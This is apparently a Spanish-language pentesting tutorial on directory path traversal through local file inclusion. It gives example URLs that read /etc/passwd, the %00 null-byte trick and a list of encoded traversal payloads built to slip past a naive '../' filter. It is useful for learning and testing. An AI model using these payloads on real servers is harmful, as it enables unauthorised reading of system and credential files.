# Directory Path Traversal

## Definición

Cuando se tiene en una explotación una posible LFI, (Local File Inclusion), puede ser posible acceder a ficheros de la máquina victima utilizando **Directory Path Traversal**. Un ejemplo es:

Tenemos una ruta del estilo:

http://miservidor.com/files?file=main.php

Y en la ruta física, que es **/var/www/html** existe realmente una página llamada main.php que es la que nos devuelve.

Podemos ahora intentar acceder al fichero /etc/passwd

http://miservidor.com/files?file=/etc/passwd

Y no funciona porque la aplicación tiene configurado que la ruta base sea /var/www/html/ por lo que está intentando cargar /var/www/html//etc/passwd y no existe.

Podemos utilizar entonces técnicas de **Directory Path Traversal**, que viene a ser intentar navegar primero hacia atrás.

http://miservidor.com/files?file=../../../../../../etc/passwd

Y esto es muy posible que funcione.

## NULL byte

A veces nos podemos encontrar con URLs de este estilo:

http://miservidor.com/files?file=main

y lo que realmente está en /var/www/html es main.php. Es la aplicación la que añade el .php.


Si intentamos acceder a:

http://miservidor.com/files?file=../../../../../../etc/passwd

La aplicación estaría buscando este fichero:

/var/www/html/../../../../../../etc/passwd.php

Para evitar esto se utiliza el **byte null** en codificación web que es **%00**. Añadimos al final este byte y funcionaria.

http://miservidor.com/files?file=../../../../../../etc/passwd%00

## Protecciones Directory Path Traversal

Muchas aplicaciones implementan protecciones de este tipo:

```php
$_GET['page'] = str_replace( '../', '', $_GET['page'] );
```

Existen formas alternativas de escribir **../../../../../../etc/passwd** de forma que puedan escapar al control. Se basan en utilizar códigos codificados, (Web Encoding). Se listan a continuación las mas frecuentes.

../../../../../../etc/

....//....//....//....//....//....//etc/

..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd

%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd

%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd

%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc/passwd

%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd

%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd

%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd